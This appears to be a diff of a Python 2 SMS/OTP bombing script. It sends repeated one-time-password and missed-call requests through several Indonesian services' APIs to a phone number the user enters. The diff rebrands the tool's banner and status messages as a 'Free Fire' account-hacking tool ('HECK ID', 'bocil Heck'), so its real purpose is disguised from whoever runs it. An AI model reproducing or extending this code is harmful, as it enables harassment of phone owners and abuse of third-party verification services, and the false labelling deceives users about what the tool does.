@@ -22,11 +22,11 @@ def main():
 #--------------------------------Banner/LOGO------------------------------------------
 def logo():
   print """%s
-  ___                                   
- / __|_ __  __ _ _ __  _ __  ___ _ _ ___ %sAuthor by %sTokicoy%s
- \__ \ '_ \/ _` | '  \| '  \/ -_) '_(_-< %sGithub %sNothing%s
- |___/ .__/\__,_|_|_|_|_|_|_\___|_| /__/ %sYoutube %sAcinakongame%s
-     |_|                                 %sTools HECK ID Free Fire"""%(qu,pu,ku,qu,pu,ku,qu,pu,ku,qu,qu)
+                                  
+   __ _ _ __  _ __  ___ _ _ ___      %sAuthor by %sTokicoy%s
+  / _` | '  \| '  \/ -_) '_(_-<      %sGithub %sNothing%s
+  \__,_|_|_|_|_|_|_\___|_| /__/      %sYoutube %sAcinakongame%s
+   Anggur Merah Cap Orang Tua        %sTools HECK ID Free Fire"""%(qu,pu,ku,qu,pu,ku,qu,pu,ku,qu,qu)
 #-------------------------------Input Function------------------------------------------
 def input():
   global nom
@@ -46,15 +46,15 @@ def asakita():
   data={'username':'62'+nom}
   h = requests.post("https://www.asakita.id/api/auth/register/otp",headers={'User-Agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36','Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'},data=data).text
   if 'MOBILE' in h:
-   sukses("1","data","freefire")
+   sukses("1","ambil data","freefire")
   else:
-   gagal("1","data","freefire")
+   gagal("1","ambil data","freefire")
 def sunchila():
 #  hih = requests.get("https://m.sunchila.com/api/generateAuthCode.ajax?mobile=0"+nom+"&countryCode=62")
  # if json.loads(hih.text)["result"] == 'true':
-   sukses("2","sms","sunchila")
+   sukses("2","bocil ambil","free fire")
   #else:
-   #gagal("2","sms","sunchila")
+   #gagal("2","bocil ambil","free fire")
 def nutriclub():
   h = requests.post("https://www.nutriclub.co.id/otp/?phone=0"+nom+"&old_phone=0"+nom,headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'})
   if json.loads(h.text)["StatusMessage"] == 'Request misscall berhasil':
@@ -64,9 +64,9 @@ def nutriclub():
 def asani():
   j = requests.post("https://api.asani.co.id/api/v1/send-otp",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'},data=json.dumps({"phone":"62"+nom,"email":"akuntesnuyul@gmail.com"}))
   if json.loads(j.text)["message"] == 'OTP Terkirim ':
-   sukses("4","sms","asani")
+   sukses("4","bocil Heck","free fire")
   else:
-   gagal("4","sms","asani")
+   gagal("4","bocil Heck","free fire")
 def wintershop():
  #dat=json.dumps(["62"+nom,"Winter Shop","",""])
 # tes = requests.post("https://api.winter-api.com/account/sendmobilecodeasync.json",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'},data=dat)
